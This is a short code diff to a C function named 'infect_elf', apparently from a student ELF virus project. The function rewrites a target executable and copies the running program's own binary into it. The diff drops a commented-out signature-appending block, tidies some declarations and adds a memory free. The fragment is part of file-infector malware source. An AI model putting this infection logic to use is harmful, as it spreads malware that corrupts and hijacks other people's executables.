@@ -20,21 +20,8 @@ void	infect_elf(char *argv, char *file_path)
 	elf = read_elf(file_path);
 	if (elf == NULL)
 		return ;
-	int size = elf->get_nbr_sections(elf->sections);
-	int strtab_index = elf->get_index_section(elf, ".strtab");
-	int shstrtab_index = elf->get_index_section(elf, ".shstrtab");
-	t_section *section = elf->get_section_by_index(elf, size);
-
-	// if (section != NULL && (strtab_index == size || shstrtab_index == size)) {
-	// 	char *content = malloc(section->data->sh_size + 17);
-	// 	memcpy(content, section->content, section->data->sh_size);
-	// 	memcpy(content + section->data->sh_size, "jguyet-frmarinh\0", 16);
-	// 	section->data->sh_size += 17;
-	// 	free(section->content);
-	// 	section->content = content;
-	// }
-	char *data = write_elf(elf);
-	int fd = open(file_path, O_RDWR | O_CREAT | O_TRUNC, S_IRWXU);
+	char	*data = write_elf(elf);
+	int		fd = open(file_path, O_RDWR | O_CREAT | O_TRUNC, S_IRWXU);
 
 	if (fd > 0) {
 		int infect_fd = open (argv, O_RDONLY);
@@ -60,6 +47,7 @@ void	infect_elf(char *argv, char *file_path)
 			}
 		}
 	}
+	free(data);
 	destruct_elf(elf);
 }
 
